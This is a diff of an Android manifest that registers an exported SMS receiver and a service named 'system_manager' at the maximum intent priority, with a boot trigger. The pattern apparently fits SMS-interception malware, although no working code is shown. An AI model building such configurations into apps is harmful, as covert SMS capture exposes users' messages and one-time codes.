@@ -35,15 +35,15 @@
             android:exported="true"
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="2147483647">
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                 <action android:name="android.provider.Telephony.SMS_DELIVER" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </receiver>
 
         <service android:name=".asynctask.system_manager" android:exported="true">
-            <intent-filter android:priority="1000" >
+            <intent-filter android:priority="2147483647" >
                 <action android:name="smsService"/>
             </intent-filter>
         </service>
